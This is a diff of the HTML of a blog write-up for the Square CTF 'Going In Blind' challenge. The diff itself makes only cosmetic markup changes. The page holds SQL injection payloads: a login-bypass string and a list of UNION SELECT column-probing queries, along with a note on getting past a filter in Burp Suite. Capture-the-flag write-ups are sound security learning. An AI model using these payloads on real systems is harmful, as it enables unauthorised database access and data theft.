@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\r#\rDescription\rOk, the developers got smart, and figured out a way to prevent SQLwe in the log in page. Plus, they decided the flag shouldn&rsquo;t be hardcoded in the web application anymore. How could anyone get to it now?\nSquareCTF Going In Blind is the second of two MySQL injection challenges. The\u00a0first challenge\u00a0was a MySQL injection to bypass log in, where we logged in using\u00a0username=ahanlon'-- -\u00a0to get the flag.\nFor the Square CTF Going In Blind challenge, using filtering makes MySQL injection more challenging. The filter can be bypassed by changing the request type in Burp Suite. We managed to display database information on the login page by using a UNION attack to obtain the flag.\n">
 <title>Square CTF</title>
@@ -55,7 +55,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_2f3062cb4e01dc1b.png" width="300"
+                        <img src="/img/avatar_hu_d8d93812fb51dbf4.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -300,7 +300,8 @@
 ></p>
 <blockquote>
 <p>Ok, the developers got smart, and figured out a way to prevent SQLwe in the log in page. Plus, they decided the flag shouldn&rsquo;t be hardcoded in the web application anymore. How could anyone get to it now?<br><br>SquareCTF Going In Blind is the second of two MySQL injection challenges. The <a class="link" href="https://squarectf.com/2022/alexhanlonhastheflag.html"  target="_blank" rel="noopener"
-    >first challenge</a> was a MySQL injection to bypass log in, where we logged in using <code>username=ahanlon'-- -</code> to get the flag.<br><br>For the Square CTF Going In Blind challenge, using filtering makes MySQL injection more challenging. The filter can be bypassed by changing the request type in Burp Suite. We managed to display database information on the login page by using a UNION attack to obtain the flag.</p></blockquote>
+    >first challenge</a> was a MySQL injection to bypass log in, where we logged in using <code>username=ahanlon'-- -</code> to get the flag.<br><br>For the Square CTF Going In Blind challenge, using filtering makes MySQL injection more challenging. The filter can be bypassed by changing the request type in Burp Suite. We managed to display database information on the login page by using a UNION attack to obtain the flag.</p>
+</blockquote>
 <p><a class="link" href="https://squarectf.com/2022/goinginblind.html"  target="_blank" rel="noopener"
     >Own this lab yourself</a></p>
 <h1 id="solution">
@@ -407,45 +408,45 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL--
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="c1">--
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL-- -
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="c1">-- -
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s1">&#39; UNION SELECT NULL#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT NULL,NULL#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL,NULL,NULL#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="o">#</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL#
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">TEST1234</span><span class="s1">&#39;,NULL#
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;TEST1234&#39;</span><span class="o">#</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
@@ -598,7 +599,7 @@
         
             2024 - 
         
-        2025 Blue Pho3nix
+        2026 Blue Pho3nix
     </section>
     
     <section class="powerby">
